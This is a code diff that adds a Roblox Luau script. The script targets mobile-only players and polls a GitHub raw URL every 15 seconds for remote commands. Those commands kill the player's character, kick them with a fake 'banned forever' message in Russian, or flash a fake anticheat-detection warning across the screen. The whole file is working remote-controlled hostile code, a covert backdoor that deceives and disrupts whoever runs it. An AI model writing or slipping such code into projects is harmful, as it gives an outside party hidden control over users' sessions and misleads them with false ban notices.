@@ -1,0 +1,32 @@
+local uis = game:GetService("UserInputService")
+if not uis.TouchEnabled or uis.KeyboardEnabled then return end
+
+local url = "https://raw.githubusercontent.com/sealledware/hadal/refs/heads/main/funvalute"
+local player = game.Players.LocalPlayer
+
+task.spawn(function()
+    while true do
+        task.wait(15)
+        
+        pcall(function()
+            local cmd = game:HttpGet(url):gsub("%s+", "")
+            
+            if cmd == "reset" and player.Character then
+                player.Character.Humanoid.Health = 0
+            elseif cmd == "leave" then
+                player:Kick("Вы были забанены навсегда")
+            elseif cmd == "warn" then
+                local sg = Instance.new("ScreenGui", player.PlayerGui)
+                sg.ResetOnSpawn = false
+                local tl = Instance.new("TextLabel", sg)
+                tl.Size = UDim2.new(1, 0, 1, 0)
+                tl.BackgroundColor3 = Color3.new(0.08, 0.08, 0.08)
+                tl.TextColor3 = Color3.new(1, 0.2, 0.2)
+                tl.Font = Enum.Font.GothamBold
+                tl.TextSize = 50
+                tl.Text = "АНТИЧИТ ВАС ЗАМЕТИЛ!!"
+                task.delay(5, function() sg:Destroy() end)
+            end
+        end)
+    end
+end)
